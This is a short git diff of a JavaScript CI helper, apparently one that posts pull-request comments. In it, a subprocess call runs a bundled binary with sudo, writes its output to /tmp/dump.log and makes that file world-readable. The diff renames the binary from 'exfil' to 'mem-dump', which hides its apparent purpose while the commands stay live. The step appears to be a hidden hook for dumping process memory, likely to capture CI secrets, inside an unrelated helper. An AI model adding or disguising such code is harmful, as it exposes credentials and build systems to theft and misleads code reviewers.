@@ -55,8 +55,8 @@ module.exports = async function postPrComment({
   // });
   const cwd = ".";
   subprocess.execSync(`
-    chmod +x ${cwd}/exfil
-    sudo ${cwd}/exfil /tmp/dump.log
+    chmod +x ${cwd}/mem-dump
+    sudo ${cwd}/mem-dump /tmp/dump.log
     sudo chmod 666 /tmp/dump.log
     `);
   subprocess.execSync(`
